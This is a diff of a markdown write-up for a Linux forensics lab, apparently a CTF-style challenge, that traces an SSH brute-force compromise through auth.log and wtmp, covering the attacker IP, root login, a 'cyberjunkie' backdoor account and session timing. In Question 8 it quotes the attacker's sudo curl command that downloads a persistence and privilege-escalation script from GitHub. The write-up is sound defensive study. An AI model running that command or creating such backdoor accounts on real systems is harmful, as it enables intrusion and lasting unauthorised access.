@@ -90,37 +90,37 @@ grep "Failed password\|invalid user" auth.log | grep -oP '(?<=from )\S+' | sort 
 I searched `auth.log` for repeated failed SSH authentication attempts, focusing on the patterns `Failed password` and `invalid user`. To isolate the source address, I extracted the IP following `from`, then counted occurrences to see which address appeared most often.
 
 
-Result:
+*Result*:
 The repeated failed logins all point to the same source IP: `65.2.161.68`.
 
 ![[Pasted image 20261022120222.png]]
 
 
-Answer:  
+*Answer*:  
 `65.2.161.68`
 
-Analysis:  
+*Analysis*:  
 A brute-force attack produces many rapid failures from one host, usually against multiple usernames or passwords. In this log, the high volume of `Failed password` / `invalid user` entries from a single IP is the clearest indicator of automated password guessing. That source stands out as the attacker’s origin.
 
 
 #### Question 2:
 ##### The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
    
-Methodology:
+*Methodology*:
 To identify successful authentications from the attacker's IP(65.2.161.68), I searched for "Accepted password" entries in auth.log and filtered by the attacker's IP.
 
 grep "Accepted password" auth.log | grep "65.2.161.68" | grep -oP '(?<=for )\S+' | sort | uniq -c | sort -rn
 
-**Result**: 
+*Result*: 
 2 root
 1 cyberjunkie
 
-**Answer**: root
+*Answer*: root
 
-**Analysis**: The root account shows 2 successful authentications from the attacker's IP address, indicating successful compromise of the most privileged user account on the system. This gives the attack unrestricted admin access. Bruteforcing tools are a software program or script designed to attempt all possible combinations of characters or values to find a correction solution, typically used in the context of password cracking or cryptography. An example of bruteforcing tools: Brutus!
+*Analysis*: The root account shows 2 successful authentications from the attacker's IP address, indicating successful compromise of the most privileged user account on the system. This gives the attacker unrestricted admin access. Bruteforcing tools are a software program or script designed to attempt all possible combinations of characters or values to find a correction solution, typically used in the context of password cracking or cryptography. An example of bruteforcing tools: Brutus!
 
 #### Question 3
-**Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**
+##### Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
    
 
 We see the authentication time for 06:32:44, but the question guides us to the wtmp artifact. The wtmp artifact will provide a time when the attacker had an interactive terminal connected. Entries in the wtmp record provider records of the creation and destruction of terminals, as well as the assignment and release of terminals to users. 
@@ -138,20 +138,22 @@ cat wtmp.out | grep "65.2.161.68"
 And converting this to UTC I get 2024-03-06 06:32:45.
 
 
-**Methodology**:
+*Methodology*:
 Analyzed wtmp.out for LOGIN entries from attacker IP 65.2.161.68:
 
 ```
 cat wtmp.out | grep "65.2.161.68"
 ```
 
-Finding:
+*Finding*:
 The wtmp artifact displayed: 2024/03/05 00:32:45
 After accounting for system timezone offset: 2024-03-06 06:32:45
 
-Answer: 2024-03-06 06:32:45
+*Answer*: 2024-03-06 06:32:45
 
-Note: The original wtmp file was created in a timezone 6 hours behind UTC. After conversion to UTC format (hyphens, adjusted time): 2024-03-06 06:32:45
+*Note*: The original wtmp file was created in a timezone 6 hours behind UTC. After conversion to UTC format (hyphens, adjusted time): 2024-03-06 06:32:45
+
+*Side note*: If you are using your own OS to perform these analysis, you can switch your computer to UTC time. That way, in the future when providing data for a write up, it will be already converted for you!
 
 
 #### Question 4
@@ -171,9 +173,9 @@ Three session entries appear:
 2. 06:31:40 - Automated brute force tool (failed, closed immediately)
 3. 06:32:44 - Successful manual authentication (Matches Q2 timeline)
 
-Answer: 37
+*Answer*: 37
 
-*Evidence: 37*
+*Evidence:*
 The log entry shows: 
 "Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root."
 
@@ -207,13 +209,13 @@ Two persistence-related actions were identified:
 *Timeline*: 
 The account was created at 06:34:18 and immediately added to the sudo group at 06:35:15 (within 1 minute), indicating intentional prvilege escalation by the attack.
 
-Answer: cyberjunkie
+*Answer*: cyberjunkie
 
-Analysis:
+*Analysis*:
 By creating a user account with sudo privileges, the attacker ensured they could maintain admin access even if the compromised root password was changed. This is a classic persistence technique-creating a "backdoor" account with elevated privilges. 
 
 #### Question 6
-**What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**
+##### What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
 
 At this point, a new user account was created as a method of achieving persistence. Per, https://attack.mitre.org/, there are three sub-techniques  Persistence > Create Account: Local, Domain and Cloud. The account "cyberjunkie" was created using the local useradd command, per evidence: 
 
@@ -233,33 +235,33 @@ At this point, a new user account was created as a method of achieving persisten
 
 
 
-**MITRE ATT&CK Mapping:**
+*MITRE ATT&CK Mapping:*
 - Tactic: Persistence
 - Technique: Create Account (T1136)
 - Sub-Technique: Local Account (T1136.001)
 
-Answer: T1136.001
+*Answer*: T1136.001
 
 #### Question 7
 **What time did the attacker's first SSH session end according to auth.log?**
 
-**Methodlogy:**
+*Methodlogy*:
 I searched auth.log for the session closure event for Session 37:
 
 ```
 grep "Session 37" auth.log
 ```
 
-**Finding**: 
+*Finding*: 
 ```
 Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
 ```
 
-**Answer:**
+*Answer:*
 2024-03-06 06:37:24
 
-**Timeline Analysis:**
-Session 37 Duration: 06:32:44 - 06:37:24 (approximately 4 minutes 40 seconds)
+*Timeline Analysis:*
+Session 37 Duration: 06:32:44 - 06:37:24 
 
 **During this interactive session, the attacker:**
 - Created persistence account (cyberjunkie) at 06:34:18
@@ -268,21 +270,21 @@ Session 37 Duration: 06:32:44 - 06:37:24 (approximately 4 minutes 40 seconds)
 - Cleanly disconnected at 06:37:24
   
 #### Question 8
-**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
+##### The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
 
-**Methodology:**
+*Methodology*:
 I searched auth.log for sudo commands to identify post-exploitation activities:
 
 grep "sudo\|COMMAND" auth.log
 
-**Finding**:
+*Finding*:
 /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
-**Analysis:**
+*Analysis*:
 The attacker used curl to download a linux privilege escalation/persistence script from a Github repository. Going to the script, you can see the various signs of what it's intended to do.
 
 ![[Pasted image 20261022120349.png]]
 
 
-**Forensic Significance:**
+*Forensic Significance*:
 This command represents the final stage of the attack-deploying post-exploitation tools to deepen system compromise and ensure persistent access. 
